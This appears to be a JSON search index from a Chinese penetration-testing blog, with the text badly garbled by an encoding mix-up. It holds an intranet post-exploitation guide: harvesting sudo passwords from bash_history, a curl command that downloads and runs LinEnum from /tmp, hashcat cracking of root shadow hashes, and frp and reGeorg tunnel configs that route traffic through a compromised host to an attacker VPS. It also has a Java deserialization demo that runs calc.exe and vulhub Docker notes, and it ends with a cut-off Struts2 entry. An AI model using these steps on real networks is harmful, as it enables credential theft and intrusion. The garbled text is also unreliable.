¹ç›®å½•ä¸‹æ–°å»ºdataç›®å½•æˆ–è€…æ˜¯éç³»ç»Ÿæ–‡ä»¶å¤¹ä¸‹çš„ç›®å½•å­˜åœ¨webçš„ä¾èµ–jaråŒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»è¿™ç‚¹åšçªç ´å£ã€‚æŸ¥çœ‹ä¸€ä¸‹ç«¯å£å¼€æ”¾æƒ…å†µå’Œå¯¹åº”çš„ç›®å½•ä½ç½®ï¼Œæœ‰ä¸€äº›shellçš„åŸºç¡€å°±å¯ä»¥æœé›†åˆ°è¿™äº›ä¿¡æ¯ã€‚ps-ef|grepjavanetstat-ANTUPæœ‰çš„æ—¶å€™æ‹¿åˆ°çš„æœºå™¨æˆ–å¤šæˆ–å°‘å­˜åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œæ¯”å¦‚dockeræœºå™¨ã€å•çº¯çš„ä¸€ä¸ªæ•°æ®åº“æœºå™¨ï¼Œé‚£ä¹ˆå°±å°½åŠ›è€Œä¸ºå»åšä¸€äº›æœé›†å·¥ä½œï¼Œç‰¹åˆ«æ˜¯dockeræœºå™¨ï¼Œé™¤äº†è·‘çš„æœåŠ¡ï¼Œæœºå™¨é‡Œé¢å¤ªå¹²å‡€äº†ï¼ŒåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚#bash_historyå‘½ä»¤æ‰§è¡Œå†å²æ–‡ä»¶ä¸€èˆ¬å»ºè®®å¿…çœ‹ï¼Œé‡Œé¢ä¼šå­˜ç€ä¸€äº›æ„æƒ³ä¸åˆ°çš„å†…å®¹ï¼Œä¸‹é¢æˆªå–ä¸€å°éƒ¨åˆ†æˆ‘åœ¨å†…ç½‘å®æˆ˜ä¸­å‘ç°çš„æƒŠå–œï¼šcdnexus-3.12.0-01llcdbin/./nexusstartpactera@575cddomain/llcdnexus3/æ³¨æ„./nexusstartå’Œcddomain/ä¸¤æ¡å‘½ä»¤ä¸­é—´çš„é‚£ä¸ªâ€œå‘½ä»¤â€ï¼Œå¯¹ï¼Œæ²¡é”™é‚£ä¸ªæ˜¯sudoerç”¨æˆ·çš„å¯†ç ï¼Œsuåˆ‡æ¢ç›´æ¥å°±æ‹¥æœ‰rootæƒé™ã€‚æˆ‘ä»¬åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆå‡ºç°è¿™æ ·çš„ç°è±¡ï¼šä¸ªäººè®¤ä¸ºæ˜¯åœ¨è¿è¡Œnexusç¨‹åºæ˜¯éœ€è¦å¯†ç æ¥æå‡æƒé™ï¼Œç„¶åè¾“å…¥è€…åœ¨ç­‰å¾…è¿‡ç¨‹ä¸­æ²¡æœ‰å‘ç°è¾“å…¥å¯†ç çš„shellè¿˜æ²¡æœ‰å›æ˜¾å‡ºæ¥å°±è¾“å…¥äº†å¯†ç ï¼Œä»è€Œå¯¼è‡´å¯†ç è¢«ç³»ç»Ÿå½“ä½œæ‰§è¡Œå‘½ä»¤è®°å½•è¿›äº†historyæ–‡ä»¶ã€‚å‘ç°è¿™ä¸ªåï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´å»çœ‹äº†è‡ªå·±æœåŠ¡å™¨å’Œè‡ªå·±çš„macæœ¬ä¸Šçš„å†å²æ–‡ä»¶ï¼Œæœç´¢æœºå™¨å¯†ç å…³é”®è¯ï¼ŒåŒæ—¶ä¹Ÿå­˜åœ¨è¿™æ ·çš„ç°è±¡æ˜æ–‡å¯†ç å­˜åœ¨äº†é‡Œé¢é†é†çŒé¡¶#ä¸€äº›è‡ªåŠ¨åŒ–æœé›†è„šæœ¬LinEnum.shcurl-o/tmp/linenum.shhttps://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.shchmod+X/tmp/linenum.sh&amp;&amp;bash/tmp/linenum.sh#Passwd&amp;Shadowï¼ˆä¸æ¨èï¼‰ä¸€èˆ¬æ¥è¯´é€šè¿‡shiroå’Œstruts2æ‹¿åˆ°çš„shellåŸºæœ¬éƒ½æ˜¯rootï¼Œå¾ˆå¤šäººéƒ½ä¼šç›´æ¥å»è¯»å–passwdæ–‡ä»¶ï¼Œå…¶å®å¹¶ä¸å¯å–ã€‚ä¸‹é¢å±•ç¤ºä¸€ä¸‹2æ ¸4GæœåŠ¡å™¨è·‘hashæ–‡ä»¶çš„è¿‡ç¨‹ã€‚ä¸€èˆ¬æ˜¯è·‘ä¸å‡ºæ¥çš„ï¼Œå“ˆå¸Œä¸å¯é€†ï¼Œé™¤éå­˜åœ¨å½©è™¹è¡¨ï¼Œä¸€èˆ¬éƒ½è·‘ä¸å‡ºæ¥ã€‚hashcat-m1800-a0-ofound.txtlinux-root.txt/usr/share/john/password.lst--forcehashcat(v4.0.1)starting...OpenCLPlatform#1:Thepoclproject====================================*Device#1:pthread-Intel(R)Xeon(R)Platinum8163CPU@2.50GHz,256/738MBallocatable,1MCUHashes:2digests;2uniquedigests,2uniquesaltsBitmaps:16bits,65536entries,0x0000ffffmask,262144bytes,5/13rotatesRules:1Applicableoptimizers:*Zero-Byte*Uses-64-BitPasswordlengthminimum:0Passwordlengthmaximum:256ATTENTION!Pure(unoptimized)OpenCLkernelsselected.Thisenablescrackingpasswordsandsalts&gt;length32butforthepriceofdrasticalreducedperformance.IfyouwanttoswitchtooptimizedOpenCLkernels,append-Otoyourcommandline.Watchdog:Hardwaremonitoringinterfacenotfoundonyoursystem.Watchdog:Temperatureaborttriggerdisabled.Watchdog:Temperatureretaintriggerdisabled.*Device#1:build_opts'-I/usr/share/hashcat/OpenCL-DVENDOR_ID=64-DCUDA_ARCH=0-DAMD_ROCM=0-DVECT_SIZE=8-DDEVICE_TYPE=2-DDGST_R0=0-DDGST_R1=1-DDGST_R2=2-DDGST_R3=3-DDGST_ELEM=16-DKERN_TYPE=1800-D_unroll'*Device#1:Kernelm01800.8f866878.kernelnotfoundincache!Buildingmaytakeawhile...ç»§ç»­:([s]tatus[p]ause[r]esume[b]ypass[c]heckpoint[q]uit=&gt;Dictionarycachebuilt:*Filename..:/usr/share/john/password.lst*Passwords.:3559*Bytes.....:26325*Keyspace..:3559*Runtime...:0secs-Device#1:autotunedkernel-accelto128-Device#1:autotunedkernel-loopsto128[s]tatus[p]ause[r]esume[b]ypass[c]heckpoint[q]uit=&gt;[s]tatus[p]ause[r]esume[b]ypass[c]heckpoApproachingfinalkeyspace-workloadadjusted.Session..........:hashcatStatus...........:ExhaustedHash.Type........:sha512crypt$6$,SHA512(Unix)Hash.Target......:linux-root.txtTime.Started.....:MonJun811:29:252020(23secs)Time.Estimated...:MonJun811:29:482020(0secs)Guess.Base.......:File(/usr/share/john/password.lst)Guess.Queue......:1/1(100.00%)Speed.Dev.#1.....:311H/s(8.82ms)Recovered........:0/2(0.00%)Digests,0/2(0.00%)SaltsProgress.........:7118/7118(100.00%)Rejected.........:0/7118(0.00%)Restore.Point....:3559/3559(100.00%)Candidates.#1....:doom2-&gt;sssHWMon.Dev.#1.....:N/AStarted:MonJun811:28:502020Stopped:MonJun811:29:4920200x03ï¼šè¿ç»´æœºå™¨ä¿¡æ¯æœé›†å¤´è„‘é£æš´ä¸­â€¦ï¼ˆæ²¡æœ‰é‡åˆ°ï¼Œæœ‰å†æ›´æ–°ï¼‰å¯†ç å¤ç”¨å¸¸è§è¿ç»´å¹³å°åŠæœåŠ¡çš„æ¼æ´åˆ©ç”¨zabbixagentå ¡å’æœºâ€¦ä¸€ï¼šå±€åŸŸç½‘é‡Œçš„ä¿¡æ¯æœé›†1x01ï¼šè·³æ¿æœºæ”»å‡»è¿™ä¸€å°èŠ‚æå‡ºçš„æ„æ€æ˜¯ï¼šè·³æ¿æœºä¸Šçš„å…¬ç½‘æš´éœ²å’Œå†…ç½‘æš´éœ²ã€‚å¦‚ï¼šå„ç§æ•°æ®åº“mysqlã€oracleã€postgresqlä»…å†…ç½‘å¼€æ”¾åŒºåˆ«åœ¨äºï¼šbindaddr=0.0.0.0or127.0.0.1Nmapscanreportfor(inside_ip_addr)20893/tcpopentextuiAlibabaDubboremotingtelnetdæ˜¾è€Œæ˜“è§ï¼Œå†…ç½‘é‡Œçš„Dubboï¼Œååºåˆ—åŒ–èµ°ä¸€æ³¢ã€‚1x02ï¼šå†…ç½‘ä»£ç†å†…ç½‘ä»£ç†ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æˆ‘ä»¬è‡ªå·±å¯æ§çš„æœ¬æœºï¼Œé€šè¿‡å„ç§ä»£ç†æ–¹æ³•ï¼ˆs5ã€s4ï¼‰ï¼ŒæŠŠæ‹¿ä¸‹çš„å†…ç½‘æœåŠ¡å™¨å½“ä½œæµé‡è½¬å‘çš„ä¸€ä¸ªä¸­é—´è·³æ¿ï¼Œå¯¹å†…ç½‘è¿›è¡Œä¸€ç³»åˆ—æˆ‘ä»¬æƒ³åšçš„äº‹æƒ…ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„ä»£ç†æœºå™¨åœ¨å†…ç½‘æ²¡æœ‰å…·ä½“çš„ä¸€ä¸ªèº«ä»½ï¼Œåªæ˜¯æˆ‘ä»¬é€šè¿‡ä»£ç†çš„æ–¹å¼æŠŠæˆ‘ä»¬å¯¹å†…ç½‘æ‰€å‘å‡ºçš„æµé‡é€šè¿‡å†…ç½‘å¯æ§æœåŠ¡å™¨å‘å†…ç½‘è¿›è¡Œè¯·æ±‚ã€‚æåŠ›æ¨èã€‚æŒ‚äº†ä»£ç†å°±å·²ç»è¿›å…¥äº†å†…ç½‘ï¼Œååˆ†æ–¹ä¾¿ã€‚åªéœ€è¦é…ç½®vpsï¼ˆfrpsï¼‰ç«¯ï¼Œæ‹¿ä¸‹shellåä¸‹è½½frpcå®¢æˆ·ç«¯ï¼Œå¯åŠ¨æœåŠ¡å°±å¯ä»¥ã€‚ä¸‹é¢é¡ºä¾¿è´´ä¸Šserverç«¯å’Œclientç«¯çš„é…ç½®æ–‡ä»¶:frpserver:$catfrp/frps.ini[common]#vpsä»£ç†TCPç›‘å¬ç«¯å£bind_port=7000#æˆæƒç ï¼Œè¯·æ”¹æˆæ›´å¤æ‚çš„token={yourtoken}#frpç®¡ç†åå°ç«¯å£ï¼Œè¯·æŒ‰è‡ªå·±éœ€æ±‚æ›´æ”¹dashboard_port=7500#frpç®¡ç†åå°ç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·æ”¹æˆè‡ªå·±çš„dashboard_user={youradminusername}dashboard_pwd={youradminpassword}enable_prometheus=true#frpæ—¥å¿—é…ç½®log_file=/var/log/frps.loglog_level=infolog_max_days=3#å¯åŠ¨vpsfrpsç«¯$./frps-cfrps.inifrpclientsï¼ˆè¢«ä»£ç†å®¢æˆ·ç«¯ï¼Œå¯ä»¥ç§°ä¸ºè·³æ¿æœºï¼‰:$cats5_jsccs.ini[common]server_addr={yourvpsip}server_port=7000token={yourtoken}#æ­¤å¤„å¯ä»¥è‡ªå®šä¹‰æ ‡ç­¾-dashboardé¢æ¿proxiesçˆ¶æ å¯¹åº”çš„name={target}ï¼Œ{target}ç¤ºä¾‹ï¼šs5_in_JStelecom[{target}]type=tcpremote_port=10010plugin=socks5plugin_user={yourconnectusername}plugin_passwd={yourconnectpassword}use_encryption=trueuse_compression=trueclientï¼ˆä»£ç†è¿›å†…ç½‘å®¢æˆ·ç«¯ï¼Œå¯ä»¥ç§°ä¸ºæ”»å‡»æœºå™¨ï¼‰1.proxifierï¼ˆæ”¯æŒmacã€windowsï¼‰é…ç½®è‡ªå®šä¹‰ï¼šserver_addr={yourvpsip}server_port=7000plugin=socks5plugin_user={yourconnectusername}plugin_passwd={yourconnectpassword}2.proxychains4(linuxã€mac)é…ç½®/etc/proxychains.confæ–‡ä»¶ï¼š[ProxyList]#addproxyhere...#meanwile#defaultssetto\"tor\"#socks4127.0.0.19050#socks5127.0.0.11081socks5{yourvpsip}{yourvpsport}{yourconnectusername}{yourconnectpassword}#burpsuiteproxy#http127.0.0.112344åº”ç”¨å³å¯ã€‚proxychains4curlhttp://{target.ip}:{target.port}/å‘½ä»¤è¿›è¡Œå†…ç½‘è®¿é—®ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œæµ·å¾·æ‹‰æ‰¹é‡å£ä»¤çˆ†ç ´ï¼Œè‹¥éœ€GUIè¿›è¡Œæµè§ˆå™¨è®¿é—®å¯ä½¿ç”¨proxifierè¿›è¡Œå…¨å±€ä»£ç†è¿›è¡Œwebè®¿é—®ã€‚1x03ï¼šå†…ç½‘ç©¿é€åœ¨å†™ä¹‹å‰æˆ‘ä»¬éœ€è¦æ˜ç¡®ä¸€ç‚¹ï¼Œå°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„å†…ç½‘ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿè€Œå†…ç½‘ç©¿é€å’Œå†…ç½‘ä»£ç†çš„åˆ†åˆ«åœ¨å“ªé‡Œï¼Ÿåœ¨ä»€ä¹ˆæƒ…å†µæˆ‘ä»¬éœ€è¦åšå†…ç½‘ç©¿é€ï¼Œä»€ä¹ˆæ—¶å€™æˆ‘ä»¬éœ€è¦åšå†…ç½‘ä»£ç†ï¼Ÿpython3reGeorgSocksProxy.py-p9999-l0.0.0.0-uhttps://www.pgyer.com/tunnel.nosocket.phpå†…ç½‘ç©¿é€å°±æ˜¯é’ˆå¯¹ä¸€ä¸ªæœºå™¨ä¸‹çš„æŸä¸€ä¸ªç‰¹å®šç«¯å£ï¼Œé€šè¿‡æµé‡è½¬å‘çš„å½¢å¼æŠŠç«¯å£æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æ‹¿ä¸‹äº†ä¸€ä¸ªlinuxæœºå™¨ï¼Œå¾ˆå·§è¿™ä¸ªæœºå™¨æ˜¯è¿ç»´æœºå™¨ï¼Œæˆ‘ä»¬å‘ç°äº†å¤§é‡çš„è¿ç»´è´¦å·å¯†ç ã€‚åˆç„¶åï¼Œå‘ç°windowsçš„è¿œç¨‹ç™»å½•æœåŠ¡å³3389ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ç«¯å£æœåŠ¡è½¬å‘çš„æŠ€å·§ï¼ŒæŠŠç«¯å£æµé‡è½¬å‘åˆ°ä¸€ä¸ªæˆ‘ä»¬å¯æ§å…¬ç½‘çš„ç«¯å£ä¸Šï¼ˆå¦‚33890ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å¯¹æˆ‘ä»¬è‡ªå·±å¯æ§å…¬ç½‘çš„ç«¯å£ä¸Šè¿›è¡Œæ•°æ®è¯·æ±‚çš„æ—¶å€™ï¼Œå°±æ˜¯åœ¨å¯¹è¿™ä¸ªwindowsæœºå™¨çš„æ•°æ®è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„ä½¿ç”¨æˆ‘ä»¬çš„åˆ°çš„è´¦å·å’Œå¯†ç æ¥è¿æ¥å¯¹åº”çš„windowsæœºå™¨ã€‚æ‰€ä»¥æˆ‘ä»¬åšå†…ç½‘ç©¿é€çš„æœ€ç»ˆç›®çš„ï¼Œå¾ˆæ˜¾ç„¶æ˜¯ï¼šæˆ‘ä»¬åœ¨å·²çŸ¥æŸä¸ªå†…ç½‘æœåŠ¡å™¨çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚3389è¿œç¨‹è¿æ¥è´¦å·å¯†ç ã€3306è¿æ¥è´¦å·å¯†ç ï¼‰ï¼Œè€Œæˆ‘ä»¬åœ¨å†…ç½‘åˆæ— æ³•ä½¿ç”¨windowsæœºå™¨è¿œç¨‹è¿æ¥ã€mysql-clientè½¯ä»¶å¯¹æˆ‘ä»¬æ‰€å¾—åˆ°çš„ä¿¡æ¯è¿›è¡Œæ˜ç¡®éªŒè¯æ—¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å†…ç½‘ç©¿é€å³æµé‡è½¬å‘çš„æ‰‹æ®µæ¥è¿›è¡Œè¿›ä¸€æ­¥éªŒè¯ã€‚1x04ï¼šå†…ç½‘ä¿¡æ¯æœé›†æŠ€å·§#nmapç”±æ­¤æ‹¿åˆ°webæœåŠ¡å™¨çš„æƒé™åï¼Œmsfæ­»æ´»éƒ½è¿ä¸ä¸Šï¼Œå°±æ— æ³•è¿›è¡Œå†…ç½‘æ‰«æï¼ŒæŸ¥èµ„æ–™åå¯ä»¥ï¼šè·³æ¿æœºï¼ˆérootæƒé™ï¼‰æœ¬åœ°ç¼–è¯‘å®‰è£…nmapï¼šwgethttps://nmap.org/dist/nmap-7.40.tar.bz2bzip2-cdnmap-7.40.tar.bz2|tarxvf-cdnmap-7.40./configureecho$?make&amp;&amp;makeinstallnoohup./nmap-p--T4-A192.168.0.0/24&amp;CobaltStrikeæ’ä»¶æ‰«æäºŒï¼šå…¸å‹æ¡ˆä¾‹å‰–æElasticSearchRCEæ•æ„Ÿä¿¡æ¯ndayâ€¦Zabbixå¼±å£ä»¤SQLæ³¨å…¥ndayâ€¦ActiveMQbasicè®¤è¯å¼±å£ä»¤ActiveMQååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-5254ï¼‰PUT&amp;MOVEæ–¹æ³•å†™å…¥shellHystrixssrfhttp://ip:6855/proxy.stream?origin=http://www.baidu.comredisæœªæˆæƒå†™å…¥crontabè®¡åˆ’shiroshiro550&amp;721rememberMeååºåˆ—åŒ–struts2s2-{01-61}â€¦å…¶å®æ€»ç»“ä¸‹æ¥å†…ç½‘é‡Œæœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„ï¼Œè¿˜æ˜¯è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†ææ‰èƒ½æ›´å¥½çš„åœ¨å†…ç½‘â€œé¨æ¸¸â€ã€‚æ€»ç»“æ€»ç»“ä¸‹æ¥ï¼Œå†…ç½‘çš„ä¿¡æ¯æ”¶é›†éœ€è¦çš„æ˜¯ç»†å¿ƒã€‚å‚è€ƒå¦‚ä½•åœ¨ç›®æ ‡å†…ç½‘ä¸­å‘ç°æ›´å¤šå­˜æ´»ä¸»æœº[Arp,icmp,tcp/udp,smb,snmpâ€¦]ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "javaDeser",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/javaDeser/",
    "date"     : "Jun 7, 2020",
    "content"  : "Javaååºåˆ—åŒ–æµ…è°ˆåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯ä¸€ç§å¸¸è§çš„ç¼–ç¨‹æ€æƒ³ï¼›phpã€pythonä¹Ÿéƒ½å­˜åœ¨æ­¤ç§æœºåˆ¶ã€‚åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬åŒ–æˆå­—èŠ‚æµï¼Œä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶æˆ–è€…æ•°æ®åº“ä¸­(ä¿å­˜æ­¤å¯¹è±¡çš„çŠ¶æ€)ã€‚ååºåˆ—åŒ–å°±æ˜¯å°†å­—èŠ‚æµè½¬åŒ–ä¸ºå¯¹è±¡ã€‚æˆ‘ä»¬æ¥åšä¸ªç®€å•çš„å°å®éªŒï¼šå®šä¹‰Peopleclass-&gt;nameã€ageï¼Œåœ¨webä¸­å¾ˆå¸¸è§ï¼šimportjava.io.Serializable;publicclassPeopleimplementsSerializable{publicStringname;publicintage;publicStringgetName(){returnname;}publicvoidsetName(Stringname){this.name=name;}publicintgetAge(){returnage;}publicvoidsetAge(intage){this.age=age;}}è°ƒç”¨åºåˆ—åŒ–æ¥å£æŠŠæˆ‘ä»¬çš„Javaå¯¹è±¡è½¬åŒ–ä¸ºbyte[]æ•°ç»„ï¼Œå°†äºŒè¿›åˆ¶å†…å®¹å†™å…¥People.txtæ–‡æ¡£ï¼šâœfilePeople.txtPeople.txt:Javaserializationdata,version5âœxxdPeople.txt00000000:aced00057372000650656f706c654499....sr..PeopleD.00000010:40802db3403b0200024900036167654c@.-.@;...I..ageL00000020:00046e616d657400124c6a6176612f6c..namet..Ljava/l00000030:616e672f537472696e673b7870000000ang/String;xp...00000040:127400087869616f6d696e67.t..xiaomingâœjavaTestpeopleå¯¹è±¡åºåˆ—åŒ–æˆåŠŸï¼#å°†åºåˆ—åŒ–æ•°æ®å†™å…¥People.txtpeopleå¯¹è±¡ååºåˆ—åŒ–æˆåŠŸï¼#è¯»å–People.txtååºåˆ—åŒ–ä»å­—èŠ‚æµè¯»å–Javaå¯¹è±¡xiaoming18ç‚¹å‡»ä»¥å¿«é€Ÿå¼€å§‹/æŸ¥çœ‹[åºåˆ—åŒ–/ååºåˆ—åŒ–]demoâŒ˜/âï¸+å·¦é”®ç§»æ­¥ä»“åº“æŸ¥çœ‹Test.javaä¸‹ä¸€æ­¥å°±æ˜¯æ¨¡æ‹Ÿååºåˆ—åŒ–æ”»å‡»ï¼›æˆ‘ä»¬æ·»åŠ ä»¥ä¸‹æ”»å‡»ä»£ç ï¼špublicclassPeopleimplementsSerializable{//æ·»åŠ ä»¥ä¸‹æ–¹æ³•ï¼Œé‡å†™Peopleç±»çš„readObject()æ–¹æ³•privatevoidreadObject(java.io.ObjectInputStreamin)throwsIOException,ClassNotFoundException{//æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•in.defaultReadObject();//æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºå‘½ä»¤Runtime.getRuntime().exec(\"calc.exe\");}}æ‰€ä»¥ç®€è€Œè¨€ä¹‹ï¼Œwebä¸­ä¼ å…¥çš„ååºåˆ—åŒ–RCEçš„pocå¿…ç„¶æ˜¯ä¼ å…¥å‚æ•°å¯æ§ã€‚æ•ˆæœï¼šå‚è€ƒJavaÂ·åºåˆ—åŒ–åˆ†æè°ƒè¯•apacheshiroååºåˆ—åŒ–æ¼æ´(CVE-2016-4437)"
  },

  {
    "title"    : "ã€ŒDockerã€:use docker elegant:)",
    "category" : "",
    "tags"     : "vulnhub, æ¼æ´å¤ç°, æ’é”™, ç¬”è®°",
    "url"      : "/blog/2020/use/Docker/Elegently/",
    "date"     : "May 27, 2020",
    "content"  : "ç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºvulhubçš„dockeræ„å»ºæ•™ç¨‹ï¼Œå°±ä¸é‡å¤é€ è½®å­äº†ã€‚è®°å½•ä¸€äº›æ—¥å¸¸ä½¿ç”¨dokceré‡åˆ°çš„é—®é¢˜dockerå¸¸ç”¨è¿æ¥é‡ç½®BurpSuiteProfessionalErrorConnectionresetå½“å‰æ— æ³•ä½¿ç”¨æ­¤é¡µé¢å½“å‰æ— æ³•å¤„ç†æ­¤è¯·æ±‚ã€‚HTTPERROR503ä¹‹å‰åšä¸€ä¸ªstruts2/s2-057çš„æ¼æ´å¤ç°ï¼Œå› ä¸ºæ˜¯è‡ªå·±çš„æœåŠ¡å™¨å°±å„ç§é€ ï¼Œæ‰«æå™¨ä»€ä¹ˆçš„ä¸€æŠŠæ¢­ã€‚æœ€åé¶åœºè¢«ç©å„¿åäº†ã€‚å°è¯•èƒ½ä¸èƒ½é‡è£…é•œåƒè§£å†³:(è¿™é‡Œæˆ‘éšä¾¿æ‹¿äº†ä¸€ä¸ªé•œåƒä¸¾åˆ—å­dockerimagesREPOSITORYTAGIMAGEIDCREATEDSIZExdebug-rce_phplatest6026f10530db3daysago393MBvulhub/php7.1.12-apache10fffe5b286c2yearsago392MBvulhub/tomcat8.566ba03f6c1d83yearsago367MBvulhub/tomcat8.0458575a05d973yearsago357MBåˆ é™¤æœ¬åœ°é•œåƒdockerrmi6026f10530dbUntagged:xdebug-rce_php:latestDeleted:sha256:6026f10530db39c61d31e0461ccbff4786e8c604c34f8ff8167d7ac89c81446aDeleted:sha256:4ce36271980f0f494e1a935bdaced37ea38d08fb167d54c50440fc009df315f9Deleted:sha256:d43d3fbbbb36edd2dbedd5df458789c7c57b5fd366403830bb6ac01b42b743d7Deleted:sha256:b15d563c13eccd51017c2bfa269f322744cb476c4c62749d5356cd0069d6391då¦‚æœæŠ¥é”™æç¤ºæ— æ³•åˆ é™¤ï¼Œå¤§æ¦‚ç‡æƒ…å†µä¸‹æ˜¯æŒ‡å®šåˆ é™¤çš„é•œåƒdockerå†…åœ¨è¿è¡Œï¼Œç›´æ¥åœæ­¢å°±è¡Œã€‚dockerrm6026f10530dbï¼šåˆ é™¤å·²åœæ­¢çš„å®¹å™¨dockerrm-f6026f10530dbï¼šåˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤é‡è¦çš„æ˜¯CONTAINERIDå€¼ï¼Œæ‰§è¡ŒdockerpsæŸ¥çœ‹å°±å¯ä»¥ï¼šsudodockerexec-it775c7c9ee1e1/bin/bashæŠ¥é”™ï¼šgoinstall:noinstalllocationfordirectoryoutsideGOPATH:å‚è€ƒï¼šhttps://stackoverflow.com/questions/26134975/go-install-no-install-location-for-directory-outside-gopathè¿›å…¥å®¹å™¨åå°±å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œifconfigï¼šbr-4c7c2091db92:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet172.24.0.1netmask255.255.0.0broadcast172.24.255.255inet6fe80::42:b7ff:feb7:f51dprefixlen64scopeid0x20&lt;link&gt;ether02:42:b7:b7:f5:1dtxqueuelen0(Ethernet)RXpackets46bytes4538(4.4KiB)RXerrors0dropped0overruns0frame0TXpackets65bytes4778(4.6KiB)TXerrors0dropped0overruns0carrier0collisions0docker0:flags=4099&lt;UP,BROADCAST,MULTICAST&gt;mtu1500inet172.18.0.1netmask255.255.0.0broadcast172.18.255.255inet6fe80::42:94ff:feb9:c3dcprefixlen64scopeid0x20&lt;link&gt;ether02:42:94:b9:c3:dctxqueuelen0(Ethernet)RXpackets1602494bytes995390708(949.2MiB)RXerrors0dropped0overruns0frame0TXpackets1434833bytes872808706(832.3MiB)TXerrors0dropped0overruns0carrier0collisions0eth0:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet172.17.185.134netmask255.255.240.0broadcast172.17.191.255inet6fe80::216:3eff:fe03:a170prefixlen64scopeid0x20&lt;link&gt;ether00:16:3e:03:a1:70txqueuelen1000(Ethernet)RXpackets6405140bytes5419609300(5.0GiB)RXerrors0dropped0overruns0frame0TXpackets4733596bytes1372915223(1.2GiB)TXerrors0dropped0overruns0carrier0collisions0lo:flags=73&lt;UP,LOOPBACK,RUNNING&gt;mtu65536inet127.0.0.1netmask255.0.0.0inet6::1prefixlen128scopeid0x10&lt;host&gt;looptxqueuelen1000(LocalLoopback)RXpackets20372bytes1792815(1.7MiB)RXerrors0dropped0overruns0frame0TXpackets20372bytes1792815(1.7MiB)TXerrors0dropped0overruns0carrier0collisions0veth382577a:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet6fe80::b067:b9ff:fece:612bprefixlen64scopeid0x20&lt;link&gt;etherb2:67:b9:ce:61:2btxqueuelen0(Ethernet)RXpackets46bytes5182(5.0KiB)RXerrors0dropped0overruns0frame0TXpackets83bytes6263(6.1KiB)TXerrors0dropped0overruns0carrier0collisions0iptableï¼šiptables-L#Warning:iptables-legacytablespresent,useiptables-legacytoseethemChainINPUT(policyACCEPT)targetprotoptsourcedestinationChainFORWARD(policyACCEPT)targetprotoptsourcedestinationDOCKER-USERall--anywhereanywhereDOCKER-ISOLATION-STAGE-1all--anywhereanywhereACCEPTall--anywhereanywherectstateRELATED,ESTABLISHEDDOCKERall--anywhereanywhereACCEPTall--anywhereanywhereACCEPTall--anywhereanywhereACCEPTall--anywhereanywherectstateRELATED,ESTABLISHEDDOCKERall--anywhereanywhereACCEPTall--anywhereanywhereACCEPTall--anywhereanywhereChainOUTPUT(policyACCEPT)targetprotoptsourcedestinationChainDOCKER(2references)targetprotoptsourcedestinationACCEPTtcp--anywhere172.24.0.2tcpdpt:http-altChainDOCKER-ISOLATION-STAGE-1(1references)targetprotoptsourcedestinationDOCKER-ISOLATION-STAGE-2all--anywhereanywhereDOCKER-ISOLATION-STAGE-2all--anywhereanywhereRETURNall--anywhereanywhereChainDOCKER-USER(1references)targetprotoptsourcedestinationRETURNall--anywhereanywhereChainDOCKER-ISOLATION-STAGE-2(2references)targetprotoptsourcedestinationDROPall--anywhereanywhereDROPall--anywhereanywhereRETURNall--anywhereanywhere"
  },

  {
    "title"    : "ã€ŒStruts2ã€:Apache-Struts2æ¡†æ¶æ¼æ´å¤ç°",
    "category" : "",
    "tags"     : "vulnhub, æ¼æ´å¤ç°, CVE, ç¬”è®°",
    "url"      : "/blog/2020/Apache/Strut2/Vuln/",
    "date"     : "May 26, 2020",
